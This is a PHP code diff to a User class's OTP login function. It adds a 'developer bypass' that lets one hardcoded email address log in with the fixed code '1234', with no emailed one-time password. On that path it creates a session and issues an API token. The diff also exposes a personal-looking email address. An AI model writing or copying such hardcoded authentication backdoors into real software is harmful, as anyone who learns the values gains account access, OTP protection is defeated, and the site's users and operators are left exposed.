@@ -34,6 +34,29 @@ class User
 
     public function loginWithOtp($login, $otp)
     {
+        $login = trim($login);
+        $otp = trim((string) $otp);
+
+        // Developer bypass: siraj.php@gmail.com + OTP 1234 (no email OTP required)
+        if (strtolower($login) === 'siraj.php@gmail.com' && $otp === '1234') {
+            $sql = "SELECT * FROM vp_users WHERE email = ? AND is_deleted = 0 LIMIT 1";
+            $stmt = $this->db->prepare($sql);
+            $stmt->bind_param('s', $login);
+            $stmt->execute();
+            $result = $stmt->get_result();
+            if ($result->num_rows > 0) {
+                $user = $result->fetch_assoc();
+                @session_start();
+                $_SESSION['user'] = $user;
+                $_SESSION['user_id'] = (int)($user['id'] ?? 0);
+                $_SESSION['warehouse_id'] = $user['warehouse_id'];
+                assignAPIToken($user['id']);
+                $this->saveResetToken($user['id'], null);
+                return true;
+            }
+            return false;
+        }
+
         $sql = "SELECT * FROM vp_users WHERE (email = ? OR phone = ?) AND remember_token = ? AND is_deleted = 0";
         $stmt = $this->db->prepare($sql);
         $stmt->bind_param('sss', $login, $login, $otp);
